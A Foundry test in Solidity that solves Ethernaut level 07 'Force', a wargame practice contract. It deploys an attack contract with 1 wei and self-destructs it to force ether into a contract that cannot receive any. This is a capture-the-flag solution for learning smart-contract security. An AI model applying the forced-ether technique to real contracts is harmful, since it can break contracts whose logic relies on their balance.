// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../../src/levels/07-Force/ForceFactory.sol";
import "../../../src/core/Ethernaut.sol";
import "./ForceAttack.sol";

contract ForceTest is Test {
    Ethernaut ethernaut;
    address attacker = address(0xabcd);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testForceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force ethernautForce = Force(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // send some eth to the attack contract
        ForceAttack attackerContract = new ForceAttack{value: 1 wei}();

        // self destruct the attack contract to force send ether to the instance contract.
        attackerContract.destruct(payable(address(ethernautForce)));

        assertGt(address(ethernautForce).balance, 0);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
